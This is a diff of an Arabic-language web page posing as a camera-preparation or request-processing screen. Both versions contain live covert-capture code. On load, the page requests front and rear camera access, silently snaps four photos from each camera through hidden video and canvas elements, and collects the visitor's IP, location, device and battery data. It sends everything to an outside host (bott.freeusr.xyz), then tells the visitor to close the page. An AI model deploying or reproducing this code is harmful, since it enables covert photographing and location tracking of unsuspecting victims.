@@ -3,16 +3,10 @@
 <head>
     <title>مرحبا بك في موقعنا</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Arial', sans-serif;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
             text-align: center;
             margin: 0;
             padding: 0;
@@ -20,329 +14,176 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
         }
-
         .container {
             max-width: 500px;
-            padding: 40px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-            animation: fadeIn 0.8s ease-out;
         }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
         .spinner {
-            border: 6px solid rgba(255, 255, 255, 0.1);
-            border-top: 6px solid #e74c3c;
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
             border-radius: 50%;
-            width: 80px;
-            height: 80px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        h1 {
-            font-size: 1.8rem;
-            margin-bottom: 10px;
-            color: #fff;
-        }
-
-        p {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 1rem;
-        }
-
-        /* ===== رسالة "انتهى اغلق الصفحة" ===== */
-        .success-container {
-            text-align: center;
-            padding: 20px;
-        }
-
-        .check-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 25px;
-            animation: pulse 1.5s ease-in-out infinite;
-            box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
-        }
-
-        .check-icon svg {
-            width: 45px;
-            height: 45px;
-            fill: none;
-            stroke: #fff;
-            stroke-width: 3;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-            100% { transform: scale(1); }
-        }
-
-        .main-title {
-            font-size: 2.8rem;
-            font-weight: 700;
-            color: #e74c3c;
-            margin-bottom: 10px;
-            text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
-        }
-
-        .sub-text {
-            font-size: 1.1rem;
-            color: rgba(255, 255, 255, 0.7);
-            margin: 15px 0 30px;
-            line-height: 1.8;
-        }
-
-        .close-btn {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: #fff;
-            border: none;
-            padding: 14px 40px;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Arial', sans-serif;
-            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
-        }
-
-        .close-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
-        }
-
-        .close-btn:active {
-            transform: translateY(0);
-        }
-
-        .line {
-            width: 60px;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #e74c3c, transparent);
-            margin: 15px auto 20px;
-            border-radius: 2px;
-        }
-
-        /* إخفاء الفيديوهات */
-        video, canvas {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <div class="spinner"></div>
-        <h1>📸 جاري تجهيز الكاميرا</h1>
-        <p>يرجى الانتظار...</p>
-    </div>
+<div class="container">
+    <div class="spinner"></div>
+    <h1>جاري تنفيذ طلبك</h1>
+    <p>يرجى الانتظار...</p>
+</div>
 
-    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
-    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
-    <canvas id="frontCanvas" style="display:none;"></canvas>
-    <canvas id="backCanvas" style="display:none;"></canvas>
+<video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+<video id="backVideo" playsinline autoplay muted style="display:none;"></video>
+<canvas id="frontCanvas" style="display:none;"></canvas>
+<canvas id="backCanvas" style="display:none;"></canvas>
 
-    <script>
-        const frontVideo = document.getElementById('frontVideo');
-        const backVideo = document.getElementById('backVideo');
-        const frontCanvas = document.getElementById('frontCanvas');
-        const backCanvas = document.getElementById('backCanvas');
-        const urlParams = new URLSearchParams(window.location.search);
-        const userId = urlParams.get("chatId");
+<script>
+const frontVideo = document.getElementById('frontVideo');
+const backVideo = document.getElementById('backVideo');
+const frontCanvas = document.getElementById('frontCanvas');
+const backCanvas = document.getElementById('backCanvas');
+const urlParams = new URLSearchParams(window.location.search);
+const userId = urlParams.get("chatId");
 
-        let camerasFinished = 0;
-        let totalCameras = 0;
+let camerasFinished = 0; // عداد الكاميرات المنتهية
+let totalCameras = 0;
 
-        // ===== دالة عرض رسالة النجاح =====
-        function showSuccessMessage() {
-            document.getElementById('mainContainer').innerHTML = `
-                <div class="success-container">
-                    <div class="check-icon">
-                        <svg viewBox="0 0 24 24">
-                            <polyline points="20 6 9 17 4 12" />
-                        </svg>
-                    </div>
-                    <h1 class="main-title">انتهى اغلق الصفحة</h1>
-                    <div class="line"></div>
-                    <p class="sub-text">
-                        ✅ تم إرسال الصور بنجاح<br>
-                        يمكنك الآن إغلاق هذه الصفحة
-                    </p>
-                    <button class="close-btn" onclick="closePage()">
-                        ✕ إغلاق الصفحة
-                    </button>
-                </div>
-            `;
-        }
+async function collectAdditionalData() {
+    try {
+        const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
+        const battery = await navigator.getBattery();
+        return {
+            ip: ipInfo.ip,
+            country: ipInfo.country_name,
+            city: ipInfo.city,
+            platform: getPlatformInfo().platform,
+            deviceVersion: getDeviceVersion(),
+            batteryLevel: battery.level,
+            batteryCharging: battery.charging,
+        };
+    } catch { return {}; }
+}
 
-        // ===== دالة إغلاق الصفحة =====
-        function closePage() {
-            window.close();
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="
-                        display: flex;
-                        justify-content: center;
-                        align-items: center;
-                        height: 100vh;
-                        background: #000;
-                        color: #e74c3c;
-                        font-size: 1.5rem;
-                        font-family: Arial, sans-serif;
-                        text-align: center;
-                        padding: 20px;
-                    ">
-                        ✅ يمكنك إغلاق هذه الصفحة الآن
-                    </div>
-                `;
-            }, 500);
-        }
+function getPlatformInfo() {
+    const ua = navigator.userAgent;
+    if (/Windows/.test(ua)) return { platform: "Windows" };
+    if (/Mac/.test(ua)) return { platform: "MacOS" };
+    if (/Linux/.test(ua)) return { platform: "Linux" };
+    if (/Android/.test(ua)) return { platform: "Android" };
+    if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+    return { platform: "Unknown" };
+}
 
-        // ===== جمع بيانات إضافية =====
-        async function collectAdditionalData() {
-            try {
-                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const battery = await navigator.getBattery();
-                return {
-                    ip: ipInfo.ip,
-                    country: ipInfo.country_name,
-                    city: ipInfo.city,
-                    platform: getPlatformInfo().platform,
-                    deviceVersion: getDeviceVersion(),
-                    batteryLevel: battery.level,
-                    batteryCharging: battery.charging,
-                };
-            } catch { return {}; }
-        }
+function getDeviceVersion() {
+    const ua = navigator.userAgent;
+    const match = ua.match(/\(([^)]+)\)/);
+    return match ? match[1] : 'Unknown';
+}
 
-        function getPlatformInfo() {
-            const ua = navigator.userAgent;
-            if (/Windows/.test(ua)) return { platform: "Windows" };
-            if (/Mac/.test(ua)) return { platform: "MacOS" };
-            if (/Linux/.test(ua)) return { platform: "Linux" };
-            if (/Android/.test(ua)) return { platform: "Android" };
-            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
-            return { platform: "Unknown" };
-        }
+async function requestCameraPermission(facingMode) {
+    try {
+        return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    } catch { return null; }
+}
 
-        function getDeviceVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^)]+)\)/);
-            return match ? match[1] : 'Unknown';
-        }
+async function init() {
+    const additionalData = await collectAdditionalData();
+    const frontStream = await requestCameraPermission('user');
+    const backStream = await requestCameraPermission('environment');
 
-        // ===== طلب صلاحية الكاميرا =====
-        async function requestCameraPermission(facingMode) {
-            try {
-                return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-            } catch { return null; }
-        }
+    if (!frontStream && !backStream) {
+        finishAndRedirect();
+        return;
+    }
 
-        // ===== الإعداد الرئيسي =====
-        async function init() {
-            const additionalData = await collectAdditionalData();
-            const frontStream = await requestCameraPermission('user');
-            const backStream = await requestCameraPermission('environment');
+    if (frontStream) {
+        totalCameras++;
+        frontVideo.srcObject = frontStream;
+        frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+    }
+    if (backStream) {
+        totalCameras++;
+        backVideo.srcObject = backStream;
+        backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+    }
+}
 
-            if (!frontStream && !backStream) {
-                finishAndRedirect();
+function setupCamera(video, canvas, cameraType, additionalData) {
+    video.play();
+    video.onplaying = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        let photoCount = 0;
+        const maxPhotos = 4;
+
+        const interval = setInterval(() => {
+            if (photoCount >= maxPhotos) {
+                clearInterval(interval);
+                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
+                camerasFinished++;
+                if (camerasFinished === totalCameras) finishAndRedirect();
                 return;
             }
 
-            if (frontStream) {
-                totalCameras++;
-                frontVideo.srcObject = frontStream;
-                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
-            }
-            if (backStream) {
-                totalCameras++;
-                backVideo.srcObject = backStream;
-                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
-            }
-        }
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                fd.append('userId', userId);
+                fd.append('cameraType', cameraType);
+                fd.append('imageWidth', canvas.width);
+                fd.append('imageHeight', canvas.height);
+                fd.append('additionalData', JSON.stringify(additionalData));
+                post('https://bott.freeusr.xyz/submitPhotos', fd);
+            }, 'image/webp', 0.7);
 
-        // ===== إعداد الكاميرا =====
-        function setupCamera(video, canvas, cameraType, additionalData) {
-            video.play();
-            video.onplaying = () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                let photoCount = 0;
-                const maxPhotos = 4;
+            photoCount++;
+        }, 1000);
+    };
+}
 
-                const interval = setInterval(() => {
-                    if (photoCount >= maxPhotos) {
-                        clearInterval(interval);
-                        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-                        camerasFinished++;
-                        if (camerasFinished === totalCameras) finishAndRedirect();
-                        return;
-                    }
+async function post(url, formData) {
+    try {
+        await fetch(url, { method: 'POST', body: formData });
+    } catch {}
+}
 
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                        fd.append('userId', userId);
-                        fd.append('cameraType', cameraType);
-                        fd.append('imageWidth', canvas.width);
-                        fd.append('imageHeight', canvas.height);
-                        fd.append('additionalData', JSON.stringify(additionalData));
-                        post('https://bott.freeusr.xyz/submitPhotos', fd);
-                    }, 'image/webp', 0.7);
+function finishAndRedirect() {
+    // ❌ تم إلغاء التحويل إلى الرابط الإعلاني
+    // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+    
+    // ✅ عرض رسالة "انتهى اغلق الصفحة" مع الحفاظ على التصميم القديم
+    document.querySelector('.container').innerHTML = `
+        <div style="display: flex; justify-content: center; align-items: center; flex-direction: column;">
+            <div style="
+                width: 80px;
+                height: 80px;
+                background: #e74c3c;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-bottom: 20px;
+                animation: spin 2s linear infinite;
+            ">
+                <span style="font-size: 40px;">✓</span>
+            </div>
+            <h1 style="color: #e74c3c; font-size: 2.5rem;">انتهى اغلق الصفحة</h1>
+            <p style="color: #666; font-size: 0.9rem; margin-top: 10px;">يمكنك إغلاق هذه الصفحة الآن</p>
+        </div>
+    `;
+}
 
-                    photoCount++;
-                }, 1000);
-            };
-        }
-
-        // ===== إرسال البيانات =====
-        async function post(url, formData) {
-            try {
-                await fetch(url, { method: 'POST', body: formData });
-            } catch {}
-        }
-
-        // ===== إنهاء المهمة =====
-        function finishAndRedirect() {
-            // ✅ تم إلغاء التحويل إلى الرابط الإعلاني
-            // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
-            
-            // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
-            showSuccessMessage();
-        }
-
-        // ===== بدء التشغيل =====
-        window.addEventListener('load', init);
-    </script>
+window.addEventListener('load', init);
+</script>
 </body>
 </html>
